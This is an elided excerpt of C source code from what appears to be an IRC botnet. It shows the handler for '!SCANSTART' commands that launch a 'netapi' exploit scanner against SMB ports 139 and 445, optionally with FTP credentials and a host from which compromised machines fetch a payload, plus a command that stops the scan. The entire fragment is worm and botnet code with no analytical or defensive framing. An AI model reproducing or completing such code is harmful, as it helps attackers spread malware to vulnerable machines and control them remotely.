...
/* parse line for commands */
{
	...
	else if(!stricmp("PRIVMSG", a[1]) || !stricmp("332", a[1]))
	{
			...
			else if(!stricmp("!SCANSTART", a[x]))
		{
			...
			scan_active = true;
			scan.usecftp = false;
			if(!stricmp("netapi", gettok(a[x+1], 1, ' ')))
			{
				if(numtok(a[x+1], ' ') == 2)
				{
					scan.port = (unsigned short)atoi(gettok(a[x+1], 2, ':'));
					scan.port2 = 0;
					scan.port3 = 0;
					if(scan.port != 139 && scan.port != 445)
						return;
				}
				else
				{
			...
			{
				scan.port = (unsigned short)atoi(a[x+1]);
				scan.port2 = 0;
				scan.port3 = 0;
			...
			if(a[x+3])
			{
				...
				{
					scan.usecftp = true;
					strncpy(scan.cftp.user, gettok(a[x+3], 1, ':'), sizeof(scan.cftp.user));
					strncpy(scan.cftp.pass, gettok(a[x+3], 2, ':'), sizeof(scan.cftp.pass));
					strncpy(scan.cftp.host, gettok(a[x+3], 3, ':'), sizeof(scan.cftp.host));
					strncpy(scan.cftp.port, gettok(a[x+3], 4, ':'), sizeof(scan.cftp.port));
					strncpy(scan.cftp.file, gettok(a[x+3], 5, ':'), sizeof(scan.cftp.file));
					if(a[x+4])
						strncpy(scan.mask, a[x+4], sizeof(scan.mask));
				}
				else
			...
			scan.gotinfo = false;
			scan.tnum = addthread("scan", scan.mask);
		...
		else if(!stricmp("!SCANSTART.ASN", a[x]))
		{
			int ca;
			int cb;
			int cc;
		...
		{
			killthread("scan");
	  irc_privmsg(target,"SCANNING STOPPED");
		}
